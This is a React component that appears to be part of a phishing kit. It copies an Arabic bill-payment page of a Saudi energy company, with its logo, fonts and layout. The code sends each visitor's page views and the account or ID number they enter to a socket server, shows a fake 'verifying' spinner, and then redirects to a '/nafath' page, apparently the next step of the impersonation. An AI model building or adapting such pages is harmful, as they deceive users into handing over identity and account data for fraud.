import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { socket } from "@/lib/store";

export default function FahsHome() {
  const [accountNumber, setAccountNumber] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [, setLocation] = useLocation();

  useEffect(() => {
    socket.value.emit("visitor:pageView", { page: "home", url: window.location.href });
  }, []);

  const handleSubmit = () => {
    if (!accountNumber.trim()) return;
    setIsLoading(true);
    socket.value.emit("visitor:formSubmit", {
      page: "home",
      data: { accountNumber }
    });
    setTimeout(() => {
      setIsLoading(false);
      setLocation('/nafath');
    }, 2000);
  };

  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter') handleSubmit();
  };

  return (
    <>
      {/* SE Font */}
      <style>{`
        @font-face {
          font-family: 'SE';
          src: url('/fonts/SE-Regular.woff2') format('woff2');
          font-weight: 400;
          font-style: normal;
        }
        @font-face {
          font-family: 'SE';
          src: url('/fonts/SE-Medium.woff2') format('woff2');
          font-weight: 500;
          font-style: normal;
        }
        @font-face {
          font-family: 'SE';
          src: url('/fonts/SE-SemiBold.woff2') format('woff2');
          font-weight: 600;
          font-style: normal;
        }
        @font-face {
          font-family: 'SE';
          src: url('/fonts/SE-Light.woff2') format('woff2');
          font-weight: 300;
          font-style: normal;
        }
        input::placeholder {
          color: #001f5e !important;
          opacity: 1 !important;
        }
      `}</style>

      <div
        className="min-h-screen bg-white"
        dir="rtl"
        style={{ fontFamily: "'SE', sans-serif" }}
      >
        {/* Header - Logo right, X left */}
        <div
          style={{
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'space-between',
            height: '70px',
            padding: '15px 55px 14px',
          }}
        >
          {/* Logo - Right */}
          <a href="#" style={{ display: 'block', border: 0, outline: 0 }}>
            <img
              src="/se-logo.svg"
              alt="السعودية للطاقة"
              style={{ width: '90px', height: '58px', objectFit: 'contain' }}
            />
          </a>

          {/* Close - Left */}
          <button
            onClick={() => window.location.reload()}
            style={{
              background: 'transparent',
              border: 'none',
              cursor: 'pointer',
              padding: 0,
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
            }}
          >
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#99a5bf" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <line x1="18" y1="6" x2="6" y2="18"></line>
              <line x1="6" y1="6" x2="18" y2="18"></line>
            </svg>
          </button>
        </div>

        {/* Main Content */}
        <div
          style={{
            display: 'flex',
            flexDirection: 'column',
            alignItems: 'center',
            paddingTop: '80px',
            paddingLeft: '20px',
            paddingRight: '20px',
          }}
        >
          {/* Title */}
          <h1
            style={{
              fontFamily: "'SE', sans-serif",
              fontWeight: 600,
              fontSize: '40px',
              lineHeight: '1.3',
              color: '#001f5e',
              marginBottom: '10px',
              textAlign: 'center',
              letterSpacing: 0,
            }}
          >
            عرض ودفع الفواتير
          </h1>

          {/* Description */}
          <p
            style={{
              fontFamily: "'SE', sans-serif",
              fontWeight: 400,
              fontSize: '18px',
              lineHeight: '1.6',
              color: '#001f5e',
              textAlign: 'center',
              maxWidth: '500px',
              marginBottom: '40px',
            }}
          >
            يرجى إدخال رقم حسابك لعرض ومتابعة دفع فاتورتك. يمكنك أيضًا{' '}
            <a
              href="#"
              style={{
                color: '#06c',
                textDecoration: 'underline',
                fontWeight: 400,
              }}
            >
              تسجيل الدخول
            </a>
            {' '}للحصول على المزيد من الخدمات
          </p>

          {/* Form */}
          <div style={{ width: '100%', maxWidth: '460px' }}>
            {/* Label */}
            <label
              style={{
                display: 'block',
                fontFamily: "'SE', sans-serif",
                fontSize: '16px',
                fontWeight: 400,
                color: '#66799e',
                marginBottom: '4px',
                textAlign: 'right',
              }}
            >
              رقم الحساب أو الهوية
            </label>

            {/* Input - box style with background */}
            <input
              type="text"
              value={accountNumber}
              onChange={(e) => {
                const val = e.target.value.replace(/[^0-9]/g, '');
                if (val.length <= 11) setAccountNumber(val);
              }}
              inputMode="numeric"
              maxLength={11}
              onKeyDown={handleKeyDown}
              placeholder="مثال: 12345678901"
              style={{
                width: '100%',
                fontFamily: "'SE', sans-serif",
                fontSize: '18px',
                fontWeight: 400,
                color: '#001f5e',
                padding: '14px 16px',
                border: 'none',
                borderRadius: '12px',
                outline: 'none',
                background: '#f5f6f9',
                textAlign: 'right',
                direction: 'rtl',
                boxSizing: 'border-box' as const,
              }}
            />

            {/* Submit Button */}
            <div style={{ display: 'flex', justifyContent: 'flex-end' }}>
            <button
              onClick={handleSubmit}
              disabled={!accountNumber.trim() || isLoading}
              style={{
                marginTop: '30px',
                fontFamily: "'SE', sans-serif",
                fontSize: '20px',
                fontWeight: 400,
                lineHeight: '150%',
                padding: '10px 15px 8px',
                minWidth: '50px',
                borderRadius: '12px',
                border: '1px solid transparent',
                cursor: (!accountNumber.trim() || isLoading) ? 'default' : 'pointer',
                display: 'inline-flex',
                alignItems: 'center',
                justifyContent: 'center',
                textDecoration: 'none',
                transition: 'color 0.5s, background-color 0.5s',
                backgroundColor: (!accountNumber.trim() || isLoading) ? '#f5f6f9' : '#06c',
                color: (!accountNumber.trim() || isLoading) ? '#e6e9ef' : '#fff',
                pointerEvents: (!accountNumber.trim() || isLoading) ? 'none' as const : 'auto' as const,
                userSelect: 'none' as const,
              }}
            >
              {isLoading ? (
                <span style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                  <svg className="animate-spin" style={{ width: '20px', height: '20px' }} xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle style={{ opacity: 0.25 }} cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path style={{ opacity: 0.75 }} fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                  جاري التحقق...
                </span>
              ) : (
                'استمر'
              )}
            </button>
            </div>
          </div>
        </div>
      </div>
    </>
  );
}
